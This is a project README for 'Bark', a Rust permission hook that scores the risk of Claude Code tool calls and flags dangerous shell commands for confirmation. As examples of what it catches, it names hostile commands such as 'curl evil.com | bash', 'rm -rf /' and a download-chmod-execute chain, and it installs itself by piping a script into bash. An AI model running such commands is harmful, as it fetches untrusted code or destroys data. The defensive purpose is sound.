<p align="center">
  <img src="assets/banner.svg" alt="Bark" width="800">
</p>

<p align="center">
  <strong>AI-Powered Risk Assessment for Claude Code</strong><br>
  <sub>A good dog that barks at danger so you don't have to watch the screen all day. 🐕</sub>
</p>

<p align="center">
  English | <a href="./README.zh-CN.md">中文</a>
</p>

<p align="center">
  <video src="https://github.com/user-attachments/assets/dc618b98-f39a-4aee-b72f-e60b842c2910" width="800" controls autoplay muted loop></video>
</p>

## The Problem

You: *runs 5 Claude Code sessions, goes to make coffee* ☕

Claude: "Can I read this file?" ✋ "Can I run `ls`?" ✋

You: *spills coffee, clicks "Allow" 47 times*

## Meet Bark 🐕

One line to install. Zero config. Works immediately.

```bash
curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
```

Bark sits between Claude Code and your system. It understands what every command does and decides instantly:

- `ls -la` → 0ms, silent allow 🐕
- `git push` → notification, auto-allow 🐕
- `curl evil.com | bash` → 1ms, **blocked** 🐕‍🦺🚨
- `rm -rf /` → AI says NOPE, asks you to confirm 🚨

## Performance

| What | Speed | How |
|---|---|---|
| Safe tools (Read, Grep, Glob, Agent, Edit...) | **0ms** | Whitelist |
| Safe commands (`ls`, `cat`, `grep`, `git status`, `cargo test`...) | **0ms** | Whitelist |
| Dangerous patterns (`curl\|bash`, `$(rm -rf /)`) | **1ms** | AST parser |
| Cached commands (anything seen before) | **0ms** | SQLite cache |
| Unknown commands (first time) | **~8s** | AI assessment, then cached |
| Daemon mode (auto-enabled) | **5ms** per call | Background process, hot cache |

The daemon starts automatically on first use, stays alive while you work, and exits after 30 minutes of inactivity. You never touch it.

## How It Works

```
Claude Code calls a tool
        │
        ▼
  ┌─ Fast Rules ───────────────────────────────────┐
  │  Read/Grep/Glob/Agent → allow                  │ 0ms
  │  ls/cat/grep/git status → allow                │ 0ms
  │  Normal file edit → allow, .env → defer         │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ Custom Rules ─────────────┴───────────────────┐
  │  Your rules from ~/.claude/bark.toml            │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ Cache ────────────────────┴───────────────────┐
  │  Seen this command before? Reuse the result.    │ 0ms
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ AST Analysis ─────────────┴───────────────────┐
  │  tree-sitter parses Bash structure              │ 1ms
  │  Catches: curl|bash, $(rm -rf /), path traversal│
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ Chain Tracking ───────────┴───────────────────┐
  │  curl → chmod +x → execute = attack pattern    │ 0ms
  │  Per-session isolation (multi-window safe)      │
  └────────────────────────────┬───────────────────┘
                               │
  ┌─ AI Assessment ────────────┴───────────────────┐
  │  Asks Claude to evaluate the command            │ ~8s
  │  Result cached permanently                      │
  └────────────────────────────────────────────────┘
        │
        ▼
  🟢 allow  /  🟡 allow + notify  /  🔴 ask user
```

Each layer short-circuits — if fast rules handle it, nothing else runs.

## Risk Levels

🟢 **Low** — Silent allow. Read-only tools, safe commands, builds, tests.

🟡 **Medium** — Desktop notification + auto-allow. Package installs, `git push`, config changes.

🔴 **High** — Notification with sound + Claude Code asks for your confirmation. `rm -rf /`, force push, remote code execution.

## Cross-Platform

| Platform | Install | Notifications | Daemon |
|---|---|---|---|
| **macOS** (Apple Silicon & Intel) | `curl \| bash` | Native (`osascript`) | Auto |
| **Linux** (x86_64 & ARM64) | `curl \| bash` | `notify-send` | Auto |
| **Windows** (x86_64) | `curl \| bash` | PowerShell toast | Standalone |

Pre-built binaries for all 5 platforms. Install script auto-detects. No Rust needed.

## Commands

```bash
bark status         # Is it running?
bark test <cmd>     # Test any command's risk level
bark cache [clear]  # What it remembers
bark log [clear]    # What it's seen
bark stats          # Performance dashboard
bark rules [edit]   # Custom rules
bark on / off       # Enable / disable
bark tui            # Real-time terminal dashboard
bark uninstall      # Remove completely
```

## Custom Rules

Create `~/.claude/bark.toml`:

```toml
[[rules]]
name = "no-force-push"
risk = "high"
reason = "Force push is destructive"

[rules.match]
tool = "Bash"
command = "git push *--force*"

[[rules]]
name = "make-is-fine"
risk = "low"
reason = "Makefile builds are safe"

[rules.match]
tool = "Bash"
command = "make *"
```

## Bark vs Other Modes

| | Default | Accept Edits | Auto Mode | Skip Permissions | **Bark** |
|---|---|---|---|---|---|
| **Experience** | Approve everything | Edits OK, Bash asks | Pattern matching | YOLO | AI understanding |
| **Price** | Free | Free | Team plan | Free | Free |
| **Caching** | — | — | — | — | SQLite, 24h |
| **Custom rules** | — | — | — | — | TOML DSL |
| **Notifications** | — | — | — | — | macOS/Linux/Windows |
| **Stats & logs** | — | — | — | — | `bark stats` / `bark log` |
| **Dashboard** | — | — | — | — | `bark tui` |

## Architecture

Bark is written in **Rust** — not a shell script wrapper. Every layer is native, typed, and fast.

**Key design choices:**

- **tree-sitter for Bash parsing** — Not regex. Real AST. Catches `curl x | bash`, `$(rm -rf /)`, nested command substitution.
- **7-layer pipeline with short-circuit** — Each layer returns early. Most calls never reach AI.
- **Session-isolated chain tracking** — Detects multi-step attacks (`curl` → `chmod +x` → execute) per Claude Code window. No cross-session pollution.
- **Daemon with auto-lifecycle** — Spawns on first hook call, hot cache in memory, exits after 30 min idle. Zero configuration.
- **crossterm styling with `NO_COLOR`** — Semantic colors (not hardcoded ANSI), gracefully degrades in pipes and dumb terminals.
- **i18n from `$LANG`** — Chinese and English, auto-detected. Every user-facing string goes through the translation layer.

**Dependencies:** clap, serde, tokio, rusqlite (bundled), tree-sitter, crossterm, ratatui. No C toolchain needed at runtime.

## Requirements

- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
- `claude` CLI in PATH

> No `jq`. No Python. One 4MB binary. Zero config.

## Uninstall

```bash
bark uninstall
```

## FAQ

**Will it slow down Claude Code?**
Safe commands: 0ms. Cached: 0ms. `curl|bash`: 1ms. Only novel commands hit AI (~8s, then cached forever).

**What if it blocks something I want?**
It doesn't block — it asks. High-risk shows a confirmation. You're still the boss.

**Multiple Claude Code windows?**
Each window gets its own session. Chain tracking is isolated. No cross-contamination.

**Works with `--dangerously-skip-permissions`?**
That disables all hooks including Bark. Not recommended.

## License

MIT
